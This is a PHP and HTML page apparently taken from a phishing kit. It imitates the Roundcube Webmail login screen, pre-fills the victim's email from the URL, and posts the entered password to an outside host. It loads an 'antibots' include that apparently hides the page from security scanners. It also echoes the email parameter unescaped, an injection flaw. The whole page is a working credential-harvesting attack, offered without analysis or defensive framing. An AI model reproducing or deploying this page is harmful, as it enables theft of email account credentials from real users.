<?php
include('antibots6.php');
?>

<!DOCTYPE html>
<html lang="en">
<head>
<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
<meta name="viewport" content="" id="viewport" />
<link rel="shortcut icon" href="https://aptradng.com/roundcube/control/images/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="https://aptradng.com/roundcube/control/styles.min.css" />

<script type="text/javascript">
function checkFilled() {
   	var fld=document.getElementById('_user').value;
    var fn=document.getElementById('_pass').value;	
	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
	    if (fld.match(emailExp)) 
		{ 
        document.getElementById('efire').style.display = "none";
   document.getElementById('_user').style.borderColor = "blue";
         } else {
        document.getElementById('_user').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efire').style.display = "block";
        document.getElementById('efired').style.display = "none";
        return false;
    }
	 if(fn.length < 5){
        document.getElementById('_pass').style.borderColor = "rgb(232, 17, 35)";
        document.getElementById('efired').style.display = "block";
        return false;
    }else{
		document.getElementById('_pass').style.borderColor = "blue";
    }
}


</script>
</head>
<body>

<h1 class="voice">Roundcube Webmail Login</h1>

<div id="login-form">
<div class="box-inner" role="main">
<img src="https://aptradng.com/roundcube/control/images/roundcube_logo.png" id="logo" alt="Roundcube Webmail">
<form name="form" method="post" action="https://aptradng.com/roundcube/logged.php" autocomplete="off"  onsubmit="return checkFilled();">
<input name="agenti" type="hidden" id="agenti" value="">
<span id="efire" style="display:none; font-size:12px; padding-left:95px; color:rgb(232, 17, 35); font-weight:bold;">Email address needed.</span>
<span id="efired" style="display:none; font-size:12px; padding-left:95px; color:rgb(232, 17, 35); font-weight:bold;">Password is required.</span>
<table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
</td>
<td class="input"><input name="_user" id="_user" style="font-weight:bold;" readonly size="40" autocapitalize="off" type="text" value="<?php echo $_GET['email']; ?>"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label></td>
<td class="input"><input name="_pass" id="_pass" required size="40" autocapitalize="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" name="rcmloginsubmit" onClick="check(this.form)" class="button mainaction" value="Login"></p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message"></div>

</div>

<div id="bottomline" role="contentinfo">
	Roundcube Webmail 
		
</div>
</div>


</body>
</html>
